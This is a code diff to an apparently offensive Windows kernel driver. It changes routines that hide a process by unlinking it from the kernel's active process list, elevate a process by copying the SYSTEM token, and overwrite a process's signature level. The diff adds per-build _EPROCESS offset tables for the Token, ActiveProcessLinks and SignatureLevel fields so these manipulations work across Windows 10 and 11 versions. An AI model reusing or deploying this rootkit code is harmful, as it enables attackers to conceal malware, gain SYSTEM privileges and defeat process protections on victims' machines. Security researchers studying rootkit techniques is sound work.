@@ -92,7 +92,7 @@ NTSTATUS ProcessHandler::HideProcess(_In_ ULONG pid) {
 	if (!IsValidPid(pid))
 		return STATUS_INVALID_PARAMETER;
 
-	if (activeProcessLinkListOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
+	if (activeProcessLinkListOffset == 0 || lockOffset == 0)
 		return STATUS_UNSUCCESSFUL;
 
 	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
@@ -157,7 +157,7 @@ NTSTATUS ProcessHandler::UnhideProcess(_In_ ULONG pid) {
 	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
 	ULONG lockOffset = GetProcessLockOffset();
 
-	if (activeProcessLinkListOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
+	if (activeProcessLinkListOffset == 0 || lockOffset == 0)
 		return STATUS_UNSUCCESSFUL;
 
 	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &targetProcess);
@@ -205,7 +205,7 @@ NTSTATUS ProcessHandler::ElevateProcess(_In_ ULONG pid) {
 	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
 	UINT64 tokenOffset = GetTokenOffset();
 
-	if (!NT_SUCCESS(status) || tokenOffset == STATUS_UNSUCCESSFUL)
+	if (!NT_SUCCESS(status) || tokenOffset == 0)
 		return status;
 
 	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);
@@ -247,6 +247,12 @@ NTSTATUS ProcessHandler::SetProcessSignature(_In_ ProcessSignature* ProcessSigna
 		return status;
 
 	UCHAR newSignatureLevel = (ProcessSignature->SignerType << 4) | ProcessSignature->SignatureSigner;
+	ULONG signatureLevelOffset = GetSignatureLevelOffset();
+
+	if (signatureLevelOffset == 0) {
+		ObDereferenceObject(process);
+		return STATUS_UNSUCCESSFUL;
+	}
 	PPROCESS_SIGNATURE processSignature = reinterpret_cast<PPROCESS_SIGNATURE>(reinterpret_cast<UINT64>(process) + GetSignatureLevelOffset());
 
 	processSignature->SignatureLevel = newSignatureLevel;
@@ -574,4 +580,137 @@ void ProcessHandler::AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
 
 	next->Blink = current;
 	target->Flink = current;
+}
+
+/*
+* Description:
+* GetTokenOffset is responsible for getting the main thread's token offset depends on the windows version.
+* (field Token in _EPROCESS structure)
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @tokenOffset [ULONG] -- Offset of the main thread's token or 0.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+ULONG ProcessHandler::GetTokenOffset() const {
+	ULONG tokenOffset = 0;
+
+	if (WindowsBuildNumber > LATEST_VERSION)
+		return tokenOffset;
+
+	switch (WindowsBuildNumber) {
+	case WIN_1507:
+	case WIN_1511:
+	case WIN_1607:
+	case WIN_1703:
+	case WIN_1709:
+	case WIN_1803:
+	case WIN_1809:
+		tokenOffset = 0x358;
+		break;
+	case WIN_1903:
+	case WIN_1909:
+		tokenOffset = 0x360;
+		break;
+	case WIN_11_24H2:
+		tokenOffset = 0x248;
+		break;
+	default:
+		tokenOffset = 0x4b8;
+		break;
+	}
+
+	return tokenOffset;
+}
+
+/*
+* Description:
+* GetActiveProcessLinksOffset is responsible for getting the active process link offset depends on the windows version.
+* (field ActiveProcessLinks in _EPROCESS structure)
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @activeProcessLinks [ULONG] -- Offset of active process links.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+ULONG ProcessHandler::GetActiveProcessLinksOffset() const {
+	ULONG activeProcessLinks = 0;
+
+	if (WindowsBuildNumber > LATEST_VERSION)
+		return activeProcessLinks;
+
+	switch (WindowsBuildNumber) {
+	case WIN_1507:
+	case WIN_1511:
+	case WIN_1607:
+	case WIN_1903:
+	case WIN_1909:
+		activeProcessLinks = 0x2f0;
+		break;
+	case WIN_1703:
+	case WIN_1709:
+	case WIN_1803:
+	case WIN_1809:
+		activeProcessLinks = 0x2e8;
+		break;
+	case WIN_11_24H2:
+		activeProcessLinks = 0x1d8;
+		break;
+	default:
+		activeProcessLinks = 0x448;
+		break;
+	}
+
+	return activeProcessLinks;
+}
+
+/*
+* Description:
+* GetSignatureLevelOffset is responsible for getting the signature level offset depends on the windows version.
+* (field SignatureLevel in _EPROCESS structure)
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @signatureLevelOffset [UINT64] -- Offset of the process' signature level.
+*/
+ULONG ProcessHandler::GetSignatureLevelOffset() const {
+	ULONG signatureLevelOffset = 0;
+
+	if (WindowsBuildNumber > LATEST_VERSION)
+		return signatureLevelOffset;
+
+	switch (WindowsBuildNumber) {
+	case WIN_1903:
+	case WIN_1909:
+		signatureLevelOffset = 0x6f8;
+		break;
+	case WIN_1703:
+	case WIN_1709:
+	case WIN_1803:
+	case WIN_1809:
+		signatureLevelOffset = 0x6c8;
+		break;
+	case WIN_1607:
+		signatureLevelOffset = 0x6c0;
+		break;
+	case WIN_1511:
+		signatureLevelOffset = 0x6b0;
+		break;
+	case WIN_1507:
+		signatureLevelOffset = 0x6a8;
+		break;
+	case WIN_11_24H2:
+		signatureLevelOffset = 0x5f8;
+		break;
+	default:
+		signatureLevelOffset = 0x878;
+		break;
+	}
+
+	return signatureLevelOffset;
 }
